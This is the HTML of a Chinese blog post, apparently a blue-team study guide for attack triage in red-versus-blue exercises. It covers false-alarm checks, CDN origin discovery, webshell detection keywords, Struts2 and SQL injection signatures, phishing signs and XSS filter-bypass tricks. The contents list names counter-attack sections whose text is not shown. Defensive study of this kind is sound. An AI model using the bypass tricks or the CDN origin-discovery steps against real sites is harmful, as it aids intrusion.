@@ -1,0 +1,1307 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>hvv_蓝队溯源反制 - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="hvv_蓝队溯源反制" />
+<meta property="og:description" content="1 攻击研判1.0.1 （1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 1.0.2 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 1.0.3 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder 1.0.4 （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。
+1.0.5 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 1.0.6 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp
+1.0.7 （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 1.0.8 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。
+1.0.9 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 1.0.10 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 1.0.11 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；&lt;img/src=1&gt;；%0a或者%0d绕过；拼凑绕过 1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="hvv_蓝队溯源反制"/>
+<meta name="twitter:description" content="1 攻击研判1.0.1 （1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 1.0.2 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 1.0.3 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder 1.0.4 （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。
+1.0.5 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 1.0.6 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp
+1.0.7 （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 1.0.8 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。
+1.0.9 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 1.0.10 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 1.0.11 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；&lt;img/src=1&gt;；%0a或者%0d绕过；拼凑绕过 1."/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" /><link rel="prev" href="http://scofield1920.github.io/javascript_prototype_pollution/" /><link rel="next" href="http://scofield1920.github.io/hvv_redteam_information_collection/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "hvv_蓝队溯源反制",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/hvv_traceabilitycountermeasures\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web, hvv","wordcount":  1173 ,
+        "url": "http:\/\/scofield1920.github.io\/hvv_traceabilitycountermeasures\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#攻击研判">攻击研判</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1怎么确定是真实攻击还是误报">（1）怎么确定是真实攻击还是误报？</a></li>
+            <li><a href="#2cdn如何绕过">（2）cdn如何绕过？</a></li>
+            <li><a href="#3常用的webshell检测工具">（3）常用的Webshell检测工具</a></li>
+            <li><a href="#4struts2命令执行的流量特征">（4）struts2命令执行的流量特征</a></li>
+            <li><a href="#5确定红队在打服务器而且进行文件上传的操作怎么判断是不是webshell">（5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？</a></li>
+            <li><a href="#6liunx系统中任何权限都能访问的临时文件位置">（6）Liunx系统中任何权限都能访问的临时文件位置</a></li>
+            <li><a href="#7如何判断是钓鱼邮件">（7）如何判断是钓鱼邮件</a></li>
+            <li><a href="#8waf和ips的区别">（8）WAF和IPS的区别</a></li>
+            <li><a href="#9拿到日志如何分析">（9）拿到日志如何分析</a></li>
+            <li><a href="#10sql注入有哪些常见的特征">（10）SQL注入有哪些常见的特征？</a></li>
+            <li><a href="#11xss弹窗函数和常见的xss绕过策略">（11）XSS弹窗函数和常见的XSS绕过策略？</a></li>
+            <li><a href="#12无文件webshell实现的方式有哪些">（12）无文件Webshell实现的方式有哪些？</a></li>
+            <li><a href="#13响应状态码都有哪些">（13）响应状态码都有哪些？</a></li>
+            <li><a href="#14发现一个sql注入告警怎么判断">（14）发现一个SQL注入告警怎么判断？</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#攻击源捕获">攻击源捕获：</a></li>
+    <li><a href="#日志审计">日志审计：</a></li>
+    <li><a href="#网络攻击溯源">网络攻击溯源：</a>
+      <ul>
+        <li><a href="#溯源流程">溯源流程：</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#1信息查询">1、信息查询：</a></li>
+                <li><a href="#2定位目标利用精准ip定位进行ip目标位置的确定">2、定位目标：利用精准IP定位，进行IP目标位置的确定</a></li>
+                <li><a href="#3收集互联网信息侧的用户id">3、收集互联网信息侧的用户ID</a></li>
+                <li><a href="#4进入跳板机收集信息">4、进入跳板机收集信息</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#邮件钓鱼攻击溯源">邮件钓鱼攻击溯源：</a></li>
+      </ul>
+    </li>
+    <li><a href="#web入侵溯源">web入侵溯源：</a></li>
+    <li><a href="#溯源反制">溯源反制：</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#ip定位法">IP定位法：</a></li>
+            <li><a href="#蜜罐捕获法">蜜罐捕获法：</a></li>
+            <li><a href="#常规渗透反打">常规渗透反打：</a>
+              <ul>
+                <li><a href="#ip有服务">IP有服务：</a></li>
+                <li><a href="#ip无服务">IP无服务：</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#webshell溯源反制">webshell溯源反制：</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#webshell查杀">webshell查杀：</a>
+              <ul>
+                <li><a href="#工具查杀">工具查杀：</a></li>
+                <li><a href="#手工查杀">手工查杀：</a></li>
+              </ul>
+            </li>
+            <li><a href="#webshell反打">webshell反打：</a>
+              <ul>
+                <li><a href="#获取照片">获取照片：</a></li>
+                <li><a href="#获取攻击者访问的时间ip">获取攻击者访问的时间、ip：</a></li>
+                <li><a href="#获取经纬度">获取经纬度：</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#cobalt-strike反制">Cobalt Strike反制</a></li>
+    <li><a href="#针对dnslog的反制">针对dnslog的反制</a>
+      <ul>
+        <li><a href="#攻击者画像">攻击者画像：</a></li>
+        <li><a href="#常见红队被反杀的姿势">常见红队被反杀的姿势</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">hvv_蓝队溯源反制</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/hvv/"><i class="far fa-folder fa-fw"></i>hvv</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1173 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#攻击研判">攻击研判</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1怎么确定是真实攻击还是误报">（1）怎么确定是真实攻击还是误报？</a></li>
+            <li><a href="#2cdn如何绕过">（2）cdn如何绕过？</a></li>
+            <li><a href="#3常用的webshell检测工具">（3）常用的Webshell检测工具</a></li>
+            <li><a href="#4struts2命令执行的流量特征">（4）struts2命令执行的流量特征</a></li>
+            <li><a href="#5确定红队在打服务器而且进行文件上传的操作怎么判断是不是webshell">（5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？</a></li>
+            <li><a href="#6liunx系统中任何权限都能访问的临时文件位置">（6）Liunx系统中任何权限都能访问的临时文件位置</a></li>
+            <li><a href="#7如何判断是钓鱼邮件">（7）如何判断是钓鱼邮件</a></li>
+            <li><a href="#8waf和ips的区别">（8）WAF和IPS的区别</a></li>
+            <li><a href="#9拿到日志如何分析">（9）拿到日志如何分析</a></li>
+            <li><a href="#10sql注入有哪些常见的特征">（10）SQL注入有哪些常见的特征？</a></li>
+            <li><a href="#11xss弹窗函数和常见的xss绕过策略">（11）XSS弹窗函数和常见的XSS绕过策略？</a></li>
+            <li><a href="#12无文件webshell实现的方式有哪些">（12）无文件Webshell实现的方式有哪些？</a></li>
+            <li><a href="#13响应状态码都有哪些">（13）响应状态码都有哪些？</a></li>
+            <li><a href="#14发现一个sql注入告警怎么判断">（14）发现一个SQL注入告警怎么判断？</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#攻击源捕获">攻击源捕获：</a></li>
+    <li><a href="#日志审计">日志审计：</a></li>
+    <li><a href="#网络攻击溯源">网络攻击溯源：</a>
+      <ul>
+        <li><a href="#溯源流程">溯源流程：</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#1信息查询">1、信息查询：</a></li>
+                <li><a href="#2定位目标利用精准ip定位进行ip目标位置的确定">2、定位目标：利用精准IP定位，进行IP目标位置的确定</a></li>
+                <li><a href="#3收集互联网信息侧的用户id">3、收集互联网信息侧的用户ID</a></li>
+                <li><a href="#4进入跳板机收集信息">4、进入跳板机收集信息</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#邮件钓鱼攻击溯源">邮件钓鱼攻击溯源：</a></li>
+      </ul>
+    </li>
+    <li><a href="#web入侵溯源">web入侵溯源：</a></li>
+    <li><a href="#溯源反制">溯源反制：</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#ip定位法">IP定位法：</a></li>
+            <li><a href="#蜜罐捕获法">蜜罐捕获法：</a></li>
+            <li><a href="#常规渗透反打">常规渗透反打：</a>
+              <ul>
+                <li><a href="#ip有服务">IP有服务：</a></li>
+                <li><a href="#ip无服务">IP无服务：</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#webshell溯源反制">webshell溯源反制：</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#webshell查杀">webshell查杀：</a>
+              <ul>
+                <li><a href="#工具查杀">工具查杀：</a></li>
+                <li><a href="#手工查杀">手工查杀：</a></li>
+              </ul>
+            </li>
+            <li><a href="#webshell反打">webshell反打：</a>
+              <ul>
+                <li><a href="#获取照片">获取照片：</a></li>
+                <li><a href="#获取攻击者访问的时间ip">获取攻击者访问的时间、ip：</a></li>
+                <li><a href="#获取经纬度">获取经纬度：</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#cobalt-strike反制">Cobalt Strike反制</a></li>
+    <li><a href="#针对dnslog的反制">针对dnslog的反制</a>
+      <ul>
+        <li><a href="#攻击者画像">攻击者画像：</a></li>
+        <li><a href="#常见红队被反杀的姿势">常见红队被反杀的姿势</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="攻击研判" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e7%a0%94%e5%88%a4" class="header-mark"></a>1 攻击研判</h2><h4 id="1怎么确定是真实攻击还是误报" class="headerLink">
+    <a href="#1%e6%80%8e%e4%b9%88%e7%a1%ae%e5%ae%9a%e6%98%af%e7%9c%9f%e5%ae%9e%e6%94%bb%e5%87%bb%e8%bf%98%e6%98%af%e8%af%af%e6%8a%a5" class="header-mark"></a>1.0.1 （1）怎么确定是真实攻击还是误报？</h4><ul>
+<li>通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报</li>
+<li>以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。</li>
+<li>查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。</li>
+<li>本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。</li>
+</ul>
+<h4 id="2cdn如何绕过" class="headerLink">
+    <a href="#2cdn%e5%a6%82%e4%bd%95%e7%bb%95%e8%bf%87" class="header-mark"></a>1.0.2 （2）cdn如何绕过？</h4><ol>
+<li>通过境外 ip 去平目标系统</li>
+<li>主动向我方的请求，如发邮件</li>
+<li>获取多个子域名 ip 对比</li>
+<li>查看 dns 记录</li>
+<li>通过网络搜索引擎去搜索</li>
+</ol>
+<h4 id="3常用的webshell检测工具" class="headerLink">
+    <a href="#3%e5%b8%b8%e7%94%a8%e7%9a%84webshell%e6%a3%80%e6%b5%8b%e5%b7%a5%e5%85%b7" class="header-mark"></a>1.0.3 （3）常用的Webshell检测工具</h4><ul>
+<li>D盾</li>
+<li>河马WEBSHELL</li>
+<li>Web shell Detector</li>
+<li>PHP Malware Finder</li>
+</ul>
+<h4 id="4struts2命令执行的流量特征" class="headerLink">
+    <a href="#4struts2%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="header-mark"></a>1.0.4 （4）struts2命令执行的流量特征</h4><p>一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。</p>
+<h4 id="5确定红队在打服务器而且进行文件上传的操作怎么判断是不是webshell" class="headerLink">
+    <a href="#5%e7%a1%ae%e5%ae%9a%e7%ba%a2%e9%98%9f%e5%9c%a8%e6%89%93%e6%9c%8d%e5%8a%a1%e5%99%a8%e8%80%8c%e4%b8%94%e8%bf%9b%e8%a1%8c%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e7%9a%84%e6%93%8d%e4%bd%9c%e6%80%8e%e4%b9%88%e5%88%a4%e6%96%ad%e6%98%af%e4%b8%8d%e6%98%afwebshell" class="header-mark"></a>1.0.5 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？</h4><ul>
+<li>一般webshell文件名后缀为jsp、php、py、asp等；</li>
+<li>上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。</li>
+<li>由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等</li>
+<li>一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。</li>
+</ul>
+<h4 id="6liunx系统中任何权限都能访问的临时文件位置" class="headerLink">
+    <a href="#6liunx%e7%b3%bb%e7%bb%9f%e4%b8%ad%e4%bb%bb%e4%bd%95%e6%9d%83%e9%99%90%e9%83%bd%e8%83%bd%e8%ae%bf%e9%97%ae%e7%9a%84%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6%e4%bd%8d%e7%bd%ae" class="header-mark"></a>1.0.6 （6）Liunx系统中任何权限都能访问的临时文件位置</h4><p>答：/var/tmp</p>
+<h4 id="7如何判断是钓鱼邮件" class="headerLink">
+    <a href="#7%e5%a6%82%e4%bd%95%e5%88%a4%e6%96%ad%e6%98%af%e9%92%93%e9%b1%bc%e9%82%ae%e4%bb%b6" class="header-mark"></a>1.0.7 （7）如何判断是钓鱼邮件</h4><ul>
+<li>以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。</li>
+<li>看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来</li>
+<li>附件放到沙箱里 看看是否有问题</li>
+<li>有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了</li>
+</ul>
+<h4 id="8waf和ips的区别" class="headerLink">
+    <a href="#8waf%e5%92%8cips%e7%9a%84%e5%8c%ba%e5%88%ab" class="header-mark"></a>1.0.8 （8）WAF和IPS的区别</h4><p>答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层   的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。</p>
+<h4 id="9拿到日志如何分析" class="headerLink">
